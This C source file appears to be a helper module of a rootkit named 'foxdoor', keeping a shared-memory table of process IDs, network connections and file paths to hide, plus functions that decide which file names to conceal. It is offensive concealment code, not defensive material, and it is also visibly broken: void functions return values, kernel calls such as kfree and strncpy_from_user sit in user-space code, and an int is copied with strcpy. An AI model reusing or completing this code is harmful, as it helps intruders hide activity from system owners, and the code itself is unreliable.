
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <netinet/in.h>
#include "utils.h"
#include "config.h"


void update_file(char *hide_file_paths){
    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);

    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }


    struct file_data *ptr = (struct file_data *)(addr + 2);

    strcpy(ptr, hide_file_paths);


    munmap(addr, DATA_STZE);
    return 0;
}

void add_proc(int pid)
{
    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);

    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    if (!search(pid, NULL)){
        int data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];
        struct data *ptr = (struct data *)(addr + 2 + sizeof(struct file_data));
        ptr[data_count].type = PROC_DATA;
        strcpy(&ptr[data_count].payload.proc.pid, &pid);
        printf("inser %d \n", data_count);
        data_count++;
        ((char *)addr)[0] = (data_count >> 8) & 0xFF;
        ((char *)addr)[1] = (data_count)&0xFF;    
    }


    munmap(addr, DATA_STZE);
    return 0;
}

void del_proc(int pid)
{

    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);

    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    int data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];

    int temp = data_count;
    struct data *ptr = (struct data *)(addr + 2 + sizeof(struct file_data));
    for (int i = 0; i < data_count; i++) {
        if (ptr[i].type == PROC_DATA && ptr[i].payload.proc.pid == pid) {
            printf("del %d \n", i);
            for (int j = i; j < data_count - 1; j++) {
                ptr[j] = ptr[j + 1];
            }
            data_count--;
            memset(&ptr[i], '\0', sizeof(struct data));
            break;
        }
    }

    ((char *)addr)[0] = (data_count >> 8) & 0xFF;
	((char *)addr)[1] = (data_count)&0xFF;

    munmap(addr, DATA_STZE);
}

int search(int pid , struct sockaddr_in hide_addr)
{
    int i, data_count;
    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }
    ftruncate(fd, DATA_STZE);
    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];
    struct data *ptr = (struct data *)(addr + 2 + sizeof(struct file_data));

    if (pid != -1) {
        for (i = 0; i<data_count; i++) {
            if (ptr[i].type == PROC_DATA && ptr[i].payload.proc.pid == pid)
                return 1;
        }
    }
    else {
        for (i = 0; i<data_count; i++) {
            if (ptr[i].type == CONN_DATA && ptr[i].payload.conn.addr.sin_addr.s_addr == hide_addr.sin_addr.s_addr && ptr[i].payload.conn.addr.sin_port == hide_addr.sin_port)
                return 1;
        }
    }
    return 0;

}

void add_addr(struct sockaddr_in hide_addr)
{
    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);

    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }


    if (!search(-1, hide_addr)){
        int data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];
        struct data *ptr = (struct data *)(addr + 2 + sizeof(struct file_data));
        ptr[data_count].type = CONN_DATA;
        ptr[data_count].payload.conn.addr.sin_addr.s_addr = hide_addr.sin_addr.s_addr;
        ptr[data_count].payload.conn.addr.sin_port = hide_addr.sin_port;
        printf("addr inser %d \n", data_count);
        data_count++;
        ((char *)addr)[0] = (data_count >> 8) & 0xFF;
        ((char *)addr)[1] = (data_count)&0xFF;
    }
    munmap(addr, DATA_STZE);
    return 0; 
}

void del_addr(struct sockaddr_in hide_addr)
{

    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);

    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    int data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];

    int temp = data_count;
    struct data *ptr = (struct data *)(addr + 2 + sizeof(struct file_data));
    for (int i = 0; i < data_count; i++) {
        if (ptr[i].type == CONN_DATA && ptr[i].payload.conn.addr.sin_addr.s_addr == hide_addr.sin_addr.s_addr && ptr[i].payload.conn.addr.sin_port == hide_addr.sin_port) {
            printf("proc del %d\n", i);
            for (int j = i; j < data_count - 1; j++) {
                ptr[j] = ptr[j + 1];
            }
            data_count--;
            memset(&ptr[i], '\0', sizeof(struct data));
            break;
        }
    }

    ((char *)addr)[0] = (data_count >> 8) & 0xFF;
	((char *)addr)[1] = (data_count)&0xFF;

    munmap(addr, DATA_STZE);
}

int create_content() {
    int data_count ;

    int fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);

    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    // data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];
    // printf("%d \n", data_count);
    // ((char *)addr)[0] = (data_count >> 8) & 0xFF;
	// ((char *)addr)[1] = (data_count)&0xFF;

    munmap(addr, DATA_STZE);
    return 0;

}

void printf_all()
{
    int fd = shm_open(SHM_NAME,  O_RDWR, 0666);
    if (fd < 0) {
        perror("Error creating shared memory object");
        return -1;
    }

    ftruncate(fd, DATA_STZE);

    void *addr = mmap(NULL, DATA_STZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (addr == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    int data_count = (((int)((char *)addr)[0]) << 8) + (int)((char *)addr)[1];

    struct data *ptr = (struct data *)(addr + 2 + sizeof(struct file_data));
    struct file_data *file = (struct file_data *)(addr + 2);

    printf("file: %s\n", file->filename);
    int i;
    for (i = 0; i<data_count; i++)
    {
        switch (ptr[i].type) {
        case PROC_DATA:
            printf("process: %d\n", ptr[i].payload.proc.pid);
            break;
        case CONN_DATA:
            printf("ip : %d  port: %d \n", ptr[i].payload.conn.addr.sin_addr.s_addr, ptr[i].payload.conn.addr.sin_port);
            break;
        }
    }

    munmap(addr, DATA_STZE);
    return 0;
}

int delete_content() {
    if (shm_unlink(SHM_NAME) == -1) {
        perror("Error removing shared memory object");
        return -1;
    }
    return 0;
}


int is_name_invisible(const char *filename)
{
	int ret = 0;
	char *name = (char *)malloc(10);

	if (strncpy(name, filename, 10) > 0)
		if (strstr(name, HIDE))
		    ret = 1;

	kfree(name);
	return ret;
}

char *hide_file_paths = NULL;
int hide_file_path_cnt = 0;

int add_hide_file_paths(char  *hide_file_paths_str) {
	// int s_len; 
	char *p;
	
	// s_len = strlen(hide_file_paths_str);
	hide_file_paths = (char *)malloc(2048);
	if (strncpy_from_user(hide_file_paths, hide_file_paths_str, 2048) <= 0)
		return -1;
	
	debug("foxdoor: hide_file_paths: %s", hide_file_paths);
	p = hide_file_paths;
	while (*p) {
		if (*p == ' ') {
			*p = 0;
			hide_file_path_cnt++;
		}
		p++;
	}
	debug("foxdoor: hide_file_path_cnt: %d", hide_file_path_cnt);
	return 0;
	
}

int delete_hide_file_paths() {
	if (hide_file_paths)
		kfree(hide_file_paths);
	hide_file_paths = NULL;
	hide_file_path_cnt = 0;
	return 0;
}

int is_name_invisible2(const char  *filename)
{
	int ret = 0;
	int path_cnt;
	char *p, *q;

	p = q = hide_file_paths;
	path_cnt = hide_file_path_cnt;
	while (path_cnt) {
		if (strstr(filename, p)) {
			ret = 1;
			break;
		}
		path_cnt--;
		if (path_cnt <= 0)
			break;
		while (*q != 0)
			q++;
		p = ++q;
	}

	return ret;
}

// int main() {

//     // delete_content();

//     int ret = create_content();
//     if (ret < 0)
//         return 0;
    
//     update_file("foxdoor");
//     add_proc(255);
//     // add_proc(123);
//     del_proc(255);

//     // del_proc(123);
//     struct sockaddr_in addr;
//     addr.sin_addr.s_addr = 429496729;
//     addr.sin_port = 65535;
//     // add_addr(addr);
//     // addr.sin_addr.s_addr = 987654321;
//     // add_addr(addr);
//     // add_addr(addr);
//     // add_addr(addr);
//     // add_addr(addr);
//     add_addr(addr);
//     del_addr(addr);


//     printf_all();
    
//     // printf("-------------------------------\n");

//     // del_proc(123);
//     // del_proc(255);
//     // printf_all();
//     // delete_content();
//     return 0;
// }
